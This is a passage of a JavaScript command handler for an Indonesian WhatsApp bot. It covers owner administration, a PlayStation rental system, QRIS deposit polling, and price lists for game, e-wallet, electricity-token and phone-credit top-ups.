if (!q) return m.reply(example("jasa install panel"))
let teks = `📦 ${text}
⏰ ${tanggal(Date.now())}

*Testimoni :*
${linkSaluran}

*Marketplace :*
${linkGrup}`
await conn.sendMessage(m.chat, {text: teks, mentions: [m.sender], contextInfo: {
externalAdReply: {
title: `Transaksi Done ✅`, 
body: `© Powered By ${namaOwner}`, 
thumbnailUrl: global.image.reply, 
sourceUrl: linkSaluran,
}}}, {quoted: null})
}
break


//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "developerbot": case "owner": {
await conn.sendContact(m.chat, [global.owner], m)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "save": case "sv": {
if (!isCreator) return
await conn.sendContact(m.chat, [m.chat.split("@")[0]], m)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "self": {
if (!isCreator) return
conn.public = false
m.reply("Berhasil mengganti ke mode *self*")
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "getcase": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("menu"))
const getcase = (cases) => {
return "case "+`\"${cases}\"`+fs.readFileSync('./case.js').toString().split('case \"'+cases+'\"')[1].split("break")[0]+"break"
}
try {
m.reply(`${getcase(q)}`)
} catch (e) {
return m.reply(`Case *${text}* tidak ditemukan`)
}
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "ping": case "uptime": {
let timestamp = speed();
let latensi = speed() - timestamp;
let tio = await nou.os.oos();
var tot = await nou.drive.info();
let respon = `
*🔴 INFORMATION SERVER*

*• Platform :* ${nou.os.type()}
*• Total Ram :* ${formatp(os.totalmem())}
*• Total Disk :* ${tot.totalGb} GB
*• Total Cpu :* ${os.cpus().length} Core
*• Runtime Vps :* ${runtime(os.uptime())}

*🔵 INFORMATION BOTZ*

*• Respon Speed :* ${latensi.toFixed(4)} detik
*• Runtime Bot :* ${runtime(process.uptime())}
`
await m.reply(respon)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "public": {
if (!isCreator) return
conn.public = true
m.reply("Berhasil mengganti ke mode *public*")
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "restart": case "rst": {
if (!isCreator) return Reply(mess.owner)
await m.reply("Memproses _restart server_ . . .")
var file = await fs.readdirSync("./session")
var anu = await file.filter(i => i !== "creds.json")
for (let t of anu) {
await fs.unlinkSync(`./session/${t}`)
}
await process.send('reset')
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "upchannel": case "upch": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("teksnya"))
await conn.sendMessage(idSaluran, {text: text})
m.reply("Berhasil mengirim pesan *teks* ke dalam channel whatsapp")
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "upchannel2": case "upch2": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("teksnya dengan mengirim foto"))
if (!/image/.test(mime)) return m.reply(example("teksnya dengan mengirim foto"))
let img = await conn.downloadAndSaveMediaMessage(qmsg)
await conn.sendMessage(idSaluran, {image: await fs.readFileSync(img), caption: text})
m.reply("Berhasil mengirim pesan *teks & foto* ke dalam channel whatsapp")
await fs.unlinkSync(img)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "getsc": {
if (m.sender.split("@")[0] !== global.owner && m.sender !== botNumber) return Reply(mess.owner)
let dir = await fs.readdirSync("./library/database/sampah")
if (dir.length >= 2) {
let res = dir.filter(e => e !== "A")
for (let i of res) {
await fs.unlinkSync(`./library/database/sampah/${i}`)
}}
await m.reply("Memproses backup script bot")
var name = `Simple-Botz-V5`
const ls = (await execSync("ls"))
.toString()
.split("\n")
.filter(
(pe) =>
pe != "node_modules" &&
pe != "session" &&
pe != "package-lock.json" &&
pe != "yarn.lock" &&
pe != ""
)
const anu = await execSync(`zip -r ${name}.zip ${ls.join(" ")}`)
await conn.sendMessage(m.sender, {document: await fs.readFileSync(`./${name}.zip`), fileName: `${name}.zip`, mimetype: "application/zip"}, {quoted: m})
await execSync(`rm -rf ${name}.zip`)
if (m.chat !== m.sender) return m.reply("Script bot berhasil dikirim ke private chat")
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "resetdb": case "rstdb": {
if (!isCreator) return Reply(mess.owner)
for (let i of Object.keys(global.db)) {
global.db[i] = {}
}
m.reply("Berhasil mereset database ✅")
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "setppbot": {
if (!isCreator) return Reply(mess.owner)
if (/image/g.test(mime)) {
var medis = await conn.downloadAndSaveMediaMessage(qmsg)
if (args[0] && args[0] == "panjang") {
const { img } = await generateProfilePicture(medis)
await conn.query({
tag: 'iq',
attrs: {
to: botNumber,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
}
]
})
await fs.unlinkSync(medis)
m.reply("Berhasil mengganti foto profil bot ✅")
} else {
await conn.updateProfilePicture(botNumber, {content: medis})
await fs.unlinkSync(medis)
m.reply("Berhasil mengganti foto profil bot ✅")
}
} else return m.reply(example('dengan mengirim foto'))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "clearchat": case "clc": {
if (!isCreator) return Reply(mess.owner)
conn.chatModify({ delete: true, lastMessages: [{ key: m.key, messageTimestamp: m.timestamp }]}, m.chat)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "listowner": case "listown": {
if (owners.length < 1) return m.reply("Tidak ada owner tambahan")
let teks = `\n *乂 List all owner tambahan*\n`
for (let i of owners) {
teks += `\n* ${i.split("@")[0]}
* *Tag :* @${i.split("@")[0]}\n`
}
conn.sendMessage(m.chat, {text: teks, mentions: owners}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "delowner": case "delown": {
if (!isCreator) return Reply(mess.owner)
if (!m.quoted && !text) return m.reply(example("6285###"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || input == botNumber) return m.reply(`Tidak bisa menghapus owner utama!`)
if (!owners.includes(input)) return m.reply(`Nomor ${input2} bukan owner bot!`)
let posi = owners.indexOf(input)
await owners.splice(posi, 1)
await fs.writeFileSync("./library/database/owner.json", JSON.stringify(owners, null, 2))
m.reply(`Berhasil menghapus owner ✅`)
}
break
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
// Command untuk menambah unit PS baru
case "addps": {
  if (!isCreator) return Reply(mess.owner)
  if (!text) return m.reply(`Contoh: .addps PS4|10000|FIFA 23,GTA V,God of War
Note: 10000 adalah harga per jam, games dipisah dengan koma`)
  
  let [type, price, games] = text.split("|")
  if (!type || !price || !games) return m.reply("Format tidak valid!")
  
  const psId = `${type}-${Date.now()}`
  const newPs = {
    id: psId,
    type: type,
    status: "available",
    harga_per_jam: parseInt(price),
    games: games.split(",").map(game => game.trim())
  }

  if (!global.db.rental_ps) {
    global.db.rental_ps = {
      ps_units: [],
      active_rentals: []
    }
  }
  
  global.db.rental_ps.ps_units.push(newPs)
  
  m.reply(`✅ Berhasil menambahkan unit PS baru
ID: ${psId}
Type: ${type}
Harga: Rp${price}/jam
Games: ${games}`)
}
break

// Command untuk menghapus unit PS
case "delps": {
  if (!isCreator) return Reply(mess.owner)
  if (!text) return m.reply(`Contoh: .delps PS4-123456`)
  
  const psIndex = global.db.rental_ps.ps_units.findIndex(p => p.id === text)
  if (psIndex === -1) return m.reply("ID PS tidak ditemukan!")
  
  global.db.rental_ps.ps_units.splice(psIndex, 1)
  m.reply(`✅ Berhasil menghapus unit PS dengan ID: ${text}`)
}
break

// Command untuk melihat daftar PS
case "listps": {
  if (!global.db.rental_ps?.ps_units.length) return m.reply("Belum ada unit PS yang terdaftar")
  
  let list = "*📋 DAFTAR PLAYSTATION*\n\n"
  global.db.rental_ps.ps_units.forEach((ps, i) => {
    list += `${i + 1}. *ID:* ${ps.id}
    *Type:* ${ps.type}
    *Status:* ${ps.status}
    *Harga:* Rp${ps.harga_per_jam}/jam
    *Games:* ${ps.games.join(", ")}\n\n`
  })
  
  list += "\nUntuk menyewa ketik: .sewaps [durasi]"
  m.reply(list)
}
break

// Command untuk menyewa PS
case "sewaps": {
  if (!text) return m.reply(`Contoh: .sewaps 2\nNote: Angka 2 adalah durasi sewa (jam)`)

  // Cek PS tersedia
  const availablePS = global.db.rental_ps?.ps_units.find(p => p.status === "available") 
  if (!availablePS) return m.reply("Maaf, tidak ada PS yang tersedia saat ini")

  const duration = parseInt(text)
  if (isNaN(duration) || duration < 1) return m.reply("Durasi tidak valid")

  const totalPrice = duration * availablePS.harga_per_jam
  const rentalId = "R" + Date.now()
  
  try {
    const UrlQr = global.qrisOrderKuota
    const amount = totalPrice + generateRandomNumber(110, 250)
    
    const response = await axios.get(`https://api.spnb.my.id/orkut/createpayment?apikey=${global.apiSimpleBot}&amount=${amount}&codeqr=${UrlQr}`)
    
    if (!response.data.success) {
      return m.reply("Gagal membuat pembayaran, silahkan coba lagi!")
    }

    const paymentData = response.data.data
    
    let msgQr = await conn.sendMessage(m.chat, {
      image: {url: paymentData.qrImageUrl}, 
      caption: `*🎮 SEWA PLAYSTATION*\n\nID: ${rentalId}\nDurasi: ${duration} jam\nTotal: Rp${totalPrice}\n\nSilahkan scan QR untuk membayar\nQR berlaku 5 menit`,
      footer: `© ${botname}`,
      buttons: [{buttonId: '.batalps', buttonText: {displayText: 'Batalkan'}, type: 1}]
    })

    db.users[m.sender].status_deposit = true
    db.users[m.sender].rental_temp = {
      ps_id: availablePS.id,
      rental_id: rentalId,
      duration: duration,
      amount: amount,
      transaction_id: paymentData.transactionId,
      msg: msgQr
    }

    while (db.users[m.sender].status_deposit) {
      await sleep(8000)
      try {
        const checkResponse = await axios.get(`https://api.spnb.my.id/orkut/cekstatus?apikey=${global.apiSimpleBot}&merchant=${global.merchantIdOrderKuota}&token=${global.apiOrderKuota}`)
        
        // Cek jika amount sama dengan yang dibayar
        if (checkResponse.data?.data?.amount == amount) {
          const rental = {
            rental_id: rentalId,
            user_id: m.sender,
            ps_id: availablePS.id,
            start_time: Date.now(),
            duration: duration,
            total_price: totalPrice,
            status: "ongoing",
            payment_status: "paid"
          }

          availablePS.status = "rented"
          global.db.rental_ps.active_rentals.push(rental)

          setTimeout(() => {
            conn.sendMessage(m.sender, {
              text: `⏰ Sewa PS Anda akan berakhir dalam 10 menit`
            })
          }, (duration * 3600 * 1000) - (10 * 60 * 1000))

          setTimeout(() => {
            availablePS.status = "available"
            rental.status = "completed"
            conn.sendMessage(m.sender, {
              text: `🎮 Sewa PS Anda telah berakhir\nTerima kasih telah menggunakan jasa kami!`
            })
          }, duration * 3600 * 1000)

          await conn.sendMessage(m.chat, {
            text: `✅ Pembayaran berhasil!\n\nID Sewa: ${rentalId}\nDurasi: ${duration} jam\nTotal: Rp${totalPrice}\nMulai: ${formatDate(Date.now())}\nSelesai: ${formatDate(Date.now() + (duration * 3600 * 1000))}`
          })

          delete db.users[m.sender].rental_temp
          db.users[m.sender].status_deposit = false
          break
        }

        // Cek expired 5 menit
        if (new Date() > new Date(paymentData.expirationTime)) {
          await conn.sendMessage(m.chat, {
            text: "❌ Pembayaran telah expired! Silahkan lakukan pemesanan ulang."
          })
          delete db.users[m.sender].rental_temp
          db.users[m.sender].status_deposit = false
          break
        }

      } catch (err) {
        console.error("Error checking payment status:", err)
        continue
      }
    }
    
  } catch (err) {
    console.error("Error in sewaps:", err)
    m.reply("Terjadi kesalahan saat memproses pembayaran, silahkan coba lagi!")
  }
}
break
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
// Tambahkan di awal file
async function Reply(teks) {
  return conn.sendMessage(m.chat, { text: teks }, { quoted: m });
}

// Perbaiki command .ff dan .daftar
case "daftar": {
  // Cek grup
  if (m.isGroup) return m.reply('Fitur ini hanya bisa digunakan di private chat')
  
  // Cek jika sudah terdaftar
  if (db.users[m.sender].daftar) return m.reply(`kamu udh terdaftar loh 😊`)
  
  // Cek input nama
  if (!text) return m.reply(`Masukan Nama\nex: ${prefix+command} username`)
  
  const srlnye = createSerial(5)
  const sldo = `${toRupiah(cekSaldo(m.sender, db_saldo))}`
  
  setTimeout( async () => {
    m.reply(`🎉 PENDAFTARAN BERHASIL! 🎉
✨ Selamat datang di layanan kami! ✨

📝 Detail Akun:
> Nama: ${text}
> Nomor: @${m.sender.split('@')[0]}
> N Serial: ${srlnye}
> Saldo: ${sldo}

💡 Nikmati layanan kami dengan berbagai kemudahan!
Terima kasih telah bergabung. 🌟`)

    db.users[m.sender].daftar = true
    db.users[m.sender].nama = `${text}`
    addRegisteredUser(m.sender, `${text}`, srlnye)
  }, 3000)
}
break

case "deposit": {
  if (!db.users[m.sender].daftar) 
      return m.reply(`Haii, Kamu Belum Terdaftar Nih, Silahkan Daftar Di Bot Dengan Cara ${prefix}daftar Cuyy !`);
  if (!text) 
      return m.reply(`Contoh: ${prefix + command} 1000`);
 
  const hdepo = `${text}`;
  const amount = parseInt(text, 10) + generateRandomNumber(110, 250); 
  let trgt = m.sender;
  
  try {
      // Buat QRIS payment menggunakan API
      const get = await axios.get(`https://api.spnb.my.id/orkut/createpayment?apikey=${global.apiSimpleBot}&amount=${amount}&codeqr=${global.codeqr}`);
      
      // Log response untuk debugging
      console.log("Payment Response:", get.data);
      
      if (!get.data.success) {
          throw new Error("Gagal membuat pembayaran QRIS");
      }

      const teks3 = `
*乂 INFORMASI PEMBAYARAN*

*• ID :* ${get.data.data.transactionId}
*• Total Pembayaran :* Rp${amount}
*• Item :* Deposit Saldo
*• Expired :* 5 menit

*Note :* 
Qris pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid!
Jika pembayaran berhasil bot akan otomatis mengirim notifikasi status pembayaran kamu.
`;

      let msgQr = await conn.sendMessage(m.chat, {
          footer: `© 2025 ${botname}`,
          buttons: [
              {
                  buttonId: `.batalbeli`,
                  buttonText: { displayText: 'Batalkan' },
                  type: 1
              }
          ],
          headerType: 1,
          viewOnce: true,
          image: {url: get.data.data.qrImageUrl}, 
          caption: teks3,
          contextInfo: {
              mentionedJid: [m.sender]
          },
      });

      // Simpan data transaksi
      db.users[m.sender].status_deposit = true;
      db.users[m.sender].deposit_data = {
          msg: msgQr,
          chat: m.sender,
          idDeposit: get.data.data.transactionId,
          amount: amount.toString(),
          expiry: Date.now() + 300000 // 5 menit
      };

      // Timer untuk expired
      setTimeout(async () => {
          if (db.users[m.sender]?.status_deposit) {
              await conn.sendMessage(m.sender, {
                  text: "QRIS Pembayaran telah expired!"
              }, {quoted: msgQr});
              
              try {
                  await conn.sendMessage(m.sender, { 
                      delete: msgQr.key 
                  });
              } catch (err) {
                  console.log("Error deleting message:", err);
              }
              
              db.users[m.sender].status_deposit = false;
              delete db.users[m.sender].deposit_data;
          }
      }, 300000);

      // Monitor pembayaran
      while (db.users[m.sender].status_deposit) {
          await sleep(8000);
          try {
              const resultcek = await axios.get(`https://api.spnb.my.id/orkut/cekstatus?apikey=${global.apiSimpleBot}&merchant=${global.merchantIdOrderKuota}&token=${global.apiOrderKuota}`);
              
              console.log("Check payment response:", resultcek.data);
              
              if (resultcek.data?.data?.amount == amount) {
                  db.users[m.sender].status_deposit = false;
                  
                  // Tambah saldo
                  addSaldo(trgt, parseInt(hdepo), db_saldo);
                  
                  await conn.sendMessage(m.sender, {
                      text: `💸 Deposit Berhasil 💸\n\n📞 Nomor: ${m.sender}\n💰 Jumlah Deposit: Rp ${hdepo}\n\n✨ Silakan cek saldo Anda dengan ketik .saldo\nTerimakasih telah menggunakan layanan kami! 🙏`
                  }, {quoted: msgQr});
                  
                  try {
                      await conn.sendMessage(m.sender, { 
                          delete: msgQr.key 
                      });
                  } catch (err) {
                      console.log("Error deleting message:", err);
                  }
                  
                  delete db.users[m.sender].deposit_data;
                  break;
              }

              // Cek expired
              if (Date.now() > db.users[m.sender].deposit_data.expiry) {
                  db.users[m.sender].status_deposit = false;
                  delete db.users[m.sender].deposit_data;
                  break;
              }

          } catch (err) {
              console.error("Payment check error:", err);
              continue;
          }
      }

  } catch (error) {
      console.error("Error in deposit:", error);
      m.reply("Mohon maaf, terjadi kesalahan saat memproses deposit. Silakan coba lagi dalam beberapa saat.");
  }
}
break;

case "saldo": {
  if (!db.users[m.sender].daftar) 
      return m.reply(`Belum terdaftar! Ketik .daftar untuk mendaftar.`);
      
  m.reply(`💰 Saldo Anda: Rp ${toRupiah(cekSaldo(m.sender, db_saldo))}

Need more? Ketik .deposit untuk isi ulang!`);
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

// Command list profit
case "listprofit": {
  if (!isCreator) return Reply(mess.owner)
  
  let msg = '*Daftar Konfigurasi Profit*\n\n'
  
  for (let category in marginConfig) {
    msg += `*${category}*\n`
    for (let sub in marginConfig[category]) {
      const conf = marginConfig[category][sub]
      msg += `${sub}:
- Markup: ${conf.markup * 100}%
- Min: Rp${conf.minProfit}
- Max: Rp${conf.maxProfit}\n`
    }
    msg += '\n'
  }
  
  m.reply(msg)
}
break

// Command untuk mengatur profit
case "setprofit": {
  if (!isCreator) return Reply(mess.owner)
  if (!text) return m.reply(`Format: .setprofit category|subcategory|markup|minProfit|maxProfit
Contoh: .setprofit games|ff|0.15|1000|10000`)
  
  try {
    const [category, subcategory, markup, min, max] = text.split("|")
    
    if (!marginConfig[category]) {
      marginConfig[category] = {}
    }
    
    marginConfig[category][subcategory] = {
      markup: parseFloat(markup),
      minProfit: parseInt(min),
      maxProfit: parseInt(max)
    }
    
    // Save ke database
    fs.writeFileSync('./lib/database/profit-config.js', 
      `module.exports = ${JSON.stringify({marginConfig, resellerLevels}, null, 2)}`)

    m.reply(`Berhasil update profit untuk ${category} ${subcategory}:
- Markup: ${markup * 100}%
- Min Profit: Rp${min}
- Max Profit: Rp${max}`)
    
  } catch (e) {
    m.reply(`Error: ${e.message}`)
  }
}
break

// Command untuk cek profit spesifik
case "profitinfo": {
  if (!isCreator) return Reply(mess.owner)
  if (!text) return m.reply(`Format: .profitinfo category|subcategory
Contoh: .profitinfo games|ff`)
  
  try {
    const [category, subcategory] = text.split("|")
    const config = marginConfig[category]?.[subcategory]
    
    if (!config) throw new Error('Kategori/subkategori tidak ditemukan')
    
    m.reply(`Info Profit ${category} ${subcategory}:
- Markup: ${config.markup * 100}%
- Min Profit: Rp${config.minProfit}
- Max Profit: Rp${config.maxProfit}`)
    
  } catch (e) {
    m.reply(`Error: ${e.message}`) 
  }
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
// Produk Mobile Legends
case "ml": case "mobilelegend": {
  try {
      if (!db.users[m.sender]?.daftar) {
          return m.reply(`🚫 Ups! Kamu Belum Terdaftar Nih!
💡 Ayo gabung sekarang juga!

Caranya gampang:
Ketik ${prefix}daftar username dan jadi bagian dari komunitas keren ini!

🌟 Daftar sekarang, dan nikmati fitur eksklusif kami!`);
      }

      if (m.isGroup) {
          return m.reply(`upss 🚫
tidak dapat diakses di dalam grup 😔`);
      }

      const { data } = await axios.get("https://www.okeconnect.com/harga/json?id=905ccd028329b0a");
      let ml = data.filter(v => /TPG Diamond Mobile Legends/i.test(v.produk) && v.harga > 0)
      ml.sort((a, b) => a.harga - b.harga)

      const list = ml.map((item) => {
          const basePrice = parseInt(item.harga)
          const markup = Math.round(basePrice * 0.1)
          const profit = Math.max(markup, 1000)
          const finalProfit = Math.min(profit, 10000)
          const finalPrice = basePrice + finalProfit
          console.log(`${item.keterangan}: Base=${basePrice}, Markup=${markup}, Profit=${finalProfit}, Final=${finalPrice}`)
          const status = item.status === "1" ? "Ready ✅" : "Close ❌";
          return `≫ *${item.keterangan}* 🌟
> Harga: Rp${toRupiahh(finalPrice)}
> Status: ${status}
> Pembelian : ${prefix}beli ${item.kode}|ID`;
      });

      const message = `Selamat Datang Di SPNB STORE. Tempat Topup Game Mobile Legends Dengan Harga Yang Murah,Legal,Dan Aman🤩

⧼ 𝗣𝗿𝗶𝗰𝗲𝗹𝗶𝘀𝘁 𝗛𝗮𝗿𝗴𝗮 ⧽\n\n${list.join('\n\n')}

SPNB STORE
${tanggalnew} || ${wib}`;

      await conn.sendMessage(m.chat, {
          footer: `© 2025 ${botname}`,
          buttons: [
              {
                  buttonId: `.menu`,
                  buttonText: { displayText: 'Menu' },
                  type: 1
              },
              {
                  buttonId: `.owner`,
                  buttonText: { displayText: 'Owner' },
                  type: 1
              }
          ],
          headerType: 1,
          viewOnce: true,
          document: fs.readFileSync("./package.json"),
          fileName: `By ${namaOwner} </>`,
          mimetype: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
          fileLength: 99999999,
          caption: message,
          contextInfo: {
              mentionedJid: [m.sender, owner+"@s.whatsapp.net"],
              forwardedNewsletterMessageInfo: {
                  newsletterJid: idSaluran,
                  newsletterName: namaSaluran
              },
              externalAdReply: {
                  title: `${botname} - ${versi}`,
                  body: `📍 Runtime : ${runtime(process.uptime())}`,
                  thumbnailUrl: global.image.menu,
                  sourceUrl: linkSaluran,
                  mediaType: 1,
                  renderLargerThumbnail: true,
              }
          }
      });

  } catch (error) {
      console.error("Error in ML command:", error);
      m.reply("Terjadi kesalahan saat mengambil data. Silakan coba lagi nanti.");
  }
}
break

// Produk PUBG
case "pubg": {
  try {
    if (!db.users[m.sender]?.daftar) {
        return m.reply(`🚫 Ups! Kamu Belum Terdaftar Nih!
💡 Ayo gabung sekarang juga!

Caranya gampang:
Ketik ${prefix}daftar username dan jadi bagian dari komunitas keren ini!

🌟 Daftar sekarang, dan nikmati fitur eksklusif kami!`);
    }

    if (m.isGroup) {
        return m.reply(`upss 🚫
tidak dapat diakses di dalam grup 😔`);
    }

  const { data } = await axios.get("https://www.okeconnect.com/harga/json?id=905ccd028329b0a");
  let pubg = data.filter(v => /TPG Game Mobile PUBG/i.test(v.produk) && v.harga > 0)
  pubg.sort((a, b) => a.harga - b.harga)

      const list = pubg.map((item) => {
          const basePrice = parseInt(item.harga)
          const markup = Math.round(basePrice * 0.1)
          const profit = Math.max(markup, 1000)
          const finalProfit = Math.min(profit, 10000)
          const finalPrice = basePrice + finalProfit
          console.log(`${item.keterangan}: Base=${basePrice}, Markup=${markup}, Profit=${finalProfit}, Final=${finalPrice}`)
          const status = item.status === "1" ? "Ready ✅" : "Close ❌";
          return `≫ *${item.keterangan}* 🌟
> Harga: Rp${toRupiahh(finalPrice)}
> Status: ${status}
> Pembelian : ${prefix}beli ${item.kode}|ID`;
      });

      const message = `Selamat Datang Di SPNB STORE. Tempat Topup Game Mobile Legends Dengan Harga Yang Murah,Legal,Dan Aman🤩

⧼ 𝗣𝗿𝗶𝗰𝗲𝗹𝗶𝘀𝘁 𝗛𝗮𝗿𝗴𝗮 ⧽\n\n${list.join('\n\n')}

SPNB STORE
${tanggalnew} || ${wib}`;

      await conn.sendMessage(m.chat, {
          footer: `© 2025 ${botname}`,
          buttons: [
              {
                  buttonId: `.menu`,
                  buttonText: { displayText: 'Menu' },
                  type: 1
              },
              {
                  buttonId: `.owner`,
                  buttonText: { displayText: 'Owner' },
                  type: 1
              }
          ],
          headerType: 1,
          viewOnce: true,
          document: fs.readFileSync("./package.json"),
          fileName: `By ${namaOwner} </>`,
          mimetype: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
          fileLength: 99999999,
          caption: message,
          contextInfo: {
              mentionedJid: [m.sender, owner+"@s.whatsapp.net"],
              forwardedNewsletterMessageInfo: {
                  newsletterJid: idSaluran,
                  newsletterName: namaSaluran
              },
              externalAdReply: {
                  title: `${botname} - ${versi}`,
                  body: `📍 Runtime : ${runtime(process.uptime())}`,
                  thumbnailUrl: global.image.menu,
                  sourceUrl: linkSaluran,
                  mediaType: 1,
                  renderLargerThumbnail: true,
              }
          }
      });

  } catch (error) {
      console.error("Error in PUBG command:", error);
      m.reply("Terjadi kesalahan saat mengambil data. Silakan coba lagi nanti.");
  }
}
break

// Produk Dana
// Top Up Dana
case "topdana": {
  try {
      if (!db.users[m.sender]?.daftar) {
          return m.reply(`🚫 Ups! Belum terdaftar!`);
      }
      if (m.isGroup) return m.reply(`Hanya di private chat`);
      
      const { data } = await axios.get("https://www.okeconnect.com/harga/json?id=905ccd028329b0a");
      
      // Debug log
      console.log("All products:", data.map(x => x.produk));
      
      // Perbaikan filter untuk Dana
      let dana = data.filter(v => /saldo dana/i.test(v.produk) && v.harga > 0);
      dana.sort((a, b) => a.harga - b.harga);

      if(dana.length === 0) {
          return m.reply("Maaf, produk Dana sedang tidak tersedia");
      }

      const list = dana.map((item) => {
          const basePrice = parseInt(item.harga);
          const markup = Math.round(basePrice * 0.05); // 5% untuk e-wallet
          const profit = Math.max(markup, 500);
          const finalProfit = Math.min(profit, 5000);
          const finalPrice = basePrice + finalProfit;

          const status = item.status === "1" ? "Ready ✅" : "Close ❌";
          return `≫ *${item.keterangan}* 🌟
> Harga: Rp${toRupiahh(finalPrice)}
> Status: ${status}
> Pembelian : ${prefix}beli ${item.kode}|NOMER`;
      });

      const message = `Selamat Datang Di SPNB STORE. Tempat Topup Saldo Dana Dengan Harga Yang Murah,Legal,Dan Aman🤩

⧼ 𝗣𝗿𝗶𝗰𝗲𝗹𝗶𝘀𝘁 𝗛𝗮𝗿𝗴𝗮 ⧽\n\n${list.join('\n\n')}

SPNB STORE
${tanggalnew} || ${wib}`;

      await conn.sendMessage(m.chat, {
          footer: `© 2025 ${botname}`,
          buttons: [
              {buttonId: `.menu`, buttonText: { displayText: 'Menu' }, type: 1},
              {buttonId: `.owner`, buttonText: { displayText: 'Owner' }, type: 1}
          ],
          headerType: 1,
          viewOnce: true,
          document: fs.readFileSync("./package.json"),
          fileName: `By ${namaOwner} </>`,
          mimetype: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
          fileLength: 99999999,
          caption: message,
          contextInfo: {
              mentionedJid: [m.sender, owner+"@s.whatsapp.net"],
              forwardedNewsletterMessageInfo: {
                  newsletterJid: idSaluran,
                  newsletterName: namaSaluran
              },
              externalAdReply: {
                  title: `${botname} - ${versi}`,
                  body: `📍 Runtime : ${runtime(process.uptime())}`,
                  thumbnailUrl: global.image.menu,
                  sourceUrl: linkSaluran,
                  mediaType: 1,
                  renderLargerThumbnail: true,
              }
          }
      });

  } catch (error) {
      console.error("Error in Dana command:", error);
      m.reply("Terjadi kesalahan saat mengambil data.");
  }
}
break

// Token PLN
case "pln": case "token": {
  try {
      if (!db.users[m.sender]?.daftar) return m.reply(`🚫 Belum terdaftar!`);
      if (m.isGroup) return m.reply(`Hanya di private chat`);

      const { data } = await axios.get("https://www.okeconnect.com/harga/json?id=905ccd028329b0a");
      let pln = data.filter(v => /token pln/i.test(v.produk) && v.harga > 0);
      pln.sort((a, b) => a.harga - b.harga);

      if(pln.length === 0) {
          return m.reply("Maaf, produk Token PLN sedang tidak tersedia");
      }

      const list = pln.map((item) => {
          const basePrice = parseInt(item.harga);
          const markup = Math.round(basePrice * 0.03); // 3% untuk PLN
          const profit = Math.max(markup, 500);
          const finalProfit = Math.min(profit, 3000);
          const finalPrice = basePrice + finalProfit;

          const status = item.status === "1" ? "Ready ✅" : "Close ❌";
          return `≫ *${item.keterangan}* 🌟
> Harga: Rp${toRupiahh(finalPrice)}
> Status: ${status}
> Pembelian : ${prefix}beli ${item.kode}|ID METERAN`;
      });

      const message = `Selamat Datang Di SPNB STORE. Tempat Topup Token PLN Dengan Harga Yang Murah,Legal,Dan Aman🤩

⧼ 𝗣𝗿𝗶𝗰𝗲𝗹𝗶𝘀𝘁 𝗛𝗮𝗿𝗴𝗮 ⧽\n\n${list.join('\n\n')}

SPNB STORE
${tanggalnew} || ${wib}`;

      // Format pengiriman pesan sama seperti sebelumnya
      await conn.sendMessage(m.chat, {
        footer: `© 2025 ${botname}`,
        buttons: [
            {buttonId: `.menu`, buttonText: { displayText: 'Menu' }, type: 1},
            {buttonId: `.owner`, buttonText: { displayText: 'Owner' }, type: 1}
        ],
        headerType: 1,
        viewOnce: true,
        document: fs.readFileSync("./package.json"),
        fileName: `By ${namaOwner} </>`,
        mimetype: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
        fileLength: 99999999,
        caption: message,
        contextInfo: {
            mentionedJid: [m.sender, owner+"@s.whatsapp.net"],
            forwardedNewsletterMessageInfo: {
                newsletterJid: idSaluran,
                newsletterName: namaSaluran
            },
            externalAdReply: {
                title: `${botname} - ${versi}`,
                body: `📍 Runtime : ${runtime(process.uptime())}`,
                thumbnailUrl: global.image.menu,
                sourceUrl: linkSaluran,
                mediaType: 1,
                renderLargerThumbnail: true,
            }
        }
    });

  } catch (error) {
      console.error("Error in PLN command:", error);
      m.reply("Terjadi kesalahan saat mengambil data.");
  }
}
break

// Pulsa
case "pulsa": {
  try {
      if (!db.users[m.sender]?.daftar) return m.reply(`🚫 Belum terdaftar!`);
      if (m.isGroup) return m.reply(`Hanya di private chat`);

      const { data } = await axios.get("https://www.okeconnect.com/harga/json?id=905ccd028329b0a");
      let pulsa = data.filter(v => /(PULSA|PULSA TRANSFER)/i.test(v.kategori) && v.harga > 0);
      pulsa.sort((a, b) => a.harga - b.harga);

      if(pulsa.length === 0) {
          return m.reply("Maaf, produk Pulsa sedang tidak tersedia");
      }

      const list = pulsa.map((item) => {
          const basePrice = parseInt(item.harga);
          const markup = Math.round(basePrice * 0.08); // 8% untuk pulsa
          const profit = Math.max(markup, 1000);
          const finalProfit = Math.min(profit, 8000);
          const finalPrice = basePrice + finalProfit;

